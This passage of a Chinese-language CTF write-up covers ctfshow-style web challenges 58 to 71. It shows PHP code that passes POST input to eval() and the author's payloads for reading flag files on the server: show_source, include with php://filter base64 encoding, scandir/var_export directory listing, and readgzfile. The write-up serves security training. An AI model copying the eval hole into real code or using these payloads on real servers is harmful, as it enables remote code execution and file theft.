</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>c=highlight_file(&#34;flag.php&#34;);
c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码
c=show_source(&#39;flag.php&#39;);
</code></pre><h4 id="web59">web59<a hidden class="anchor" aria-hidden="true" href="#web59">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>解法与上题一致，不再赘述</p>
<p>（没搞懂两题有什么区别）</p>
<h4 id="web60">web60<a hidden class="anchor" aria-hidden="true" href="#web60">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>解法依旧与web58一致</p>
<p>可能我太菜了看不出有什么区别</p>
<h4 id="web61">web61<a hidden class="anchor" aria-hidden="true" href="#web61">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧web58</p>
<h4 id="web62">web62<a hidden class="anchor" aria-hidden="true" href="#web62">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;</p>
<h4 id="web62-1">web62<a hidden class="anchor" aria-hidden="true" href="#web62-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;&hellip;</p>
<h4 id="web63">web63<a hidden class="anchor" aria-hidden="true" href="#web63">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;&hellip;</p>
<h4 id="web64">web64<a hidden class="anchor" aria-hidden="true" href="#web64">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>嘶，怎么还是那样&hellip;</p>
<h4 id="web65">web65<a hidden class="anchor" aria-hidden="true" href="#web65">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>同上&hellip;</p>
<h4 id="web66">web66<a hidden class="anchor" aria-hidden="true" href="#web66">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>本来以为还是一样的，没想到&hellip;</p>
<p><img alt="image-20241128215426797" loading="lazy" src="../assets/image-20241128215426797.png"></p>
<p>看来我们要想办法查目录了</p>
<p>我们可以尝试利用php中查询目录的函数</p>
<p>比如 scandir()</p>
<p><img alt="image-20241128233043919" loading="lazy" src="../assets/image-20241128233043919.png"></p>
<pre tabindex="0"><code>var_dump(scandir(&#39;/&#39;));
</code></pre><p><img alt="image-20241128233314034" loading="lazy" src="../assets/image-20241128233314034.png"></p>
<p>接下来就是查flag，可以通过文件包含来查</p>
<p><img alt="image-20241128233701394" loading="lazy" src="../assets/image-20241128233701394.png"></p>
<p>flag.txt前面记得加上/</p>
<h4 id="web67">web67<a hidden class="anchor" aria-hidden="true" href="#web67">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题解法与web66一致</p>
<h4 id="web68">web68<a hidden class="anchor" aria-hidden="true" href="#web68">#</a></h4>
<p><img alt="image-20241128234343226" loading="lazy" src="../assets/image-20241128234343226.png"></p>
<p>这题貌似只是show_source和highlight_file用不了，其他没什么变化</p>
<p>可以直接用前两题的方法</p>
<p>也可以直接</p>
<pre tabindex="0"><code>c=include(&#39;/flag.txt&#39;) //赌
</code></pre><h4 id="web69">web69<a hidden class="anchor" aria-hidden="true" href="#web69">#</a></h4>
<p><img alt="image-20241128234507588" loading="lazy" src="../assets/image-20241128234507588.png"></p>
<p>这题相比上一题，print_r() 和 var_dump() 也被禁用了</p>
<p>我们可以通过寻找其他可以打印数组的函数来打印目录</p>
<p>我们可以通过var_export()来代替，从而打印目录</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));
</code></pre><p><img alt="image-20241129130708792" loading="lazy" src="../assets/image-20241129130708792.png"></p>
<p>接下读flag即可</p>
<pre tabindex="0"><code>c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=/flag.txt
</code></pre><p>其他的解法：</p>
<p>查文件</p>
<pre tabindex="0"><code>?c=echo implode(&#34;,&#34;,(scandir(&#39;/&#39;))); 
?c=echo json_encode(scandir(&#34;/&#34;));
</code></pre><p>读文件</p>
<pre tabindex="0"><code>?c=readgzfile(&#39;/flag.txt&#39;);
</code></pre><h4 id="web70">web70<a hidden class="anchor" aria-hidden="true" href="#web70">#</a></h4>
<p><img alt="image-20241129132128259" loading="lazy" src="../assets/image-20241129132128259.png"></p>
<p>这题把error_reporting()和ini_set()禁用了</p>
<p>虽然不知道有什么用，不影响我用上一题的方法读flag</p>
<h4 id="web71">web71<a hidden class="anchor" aria-hidden="true" href="#web71">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
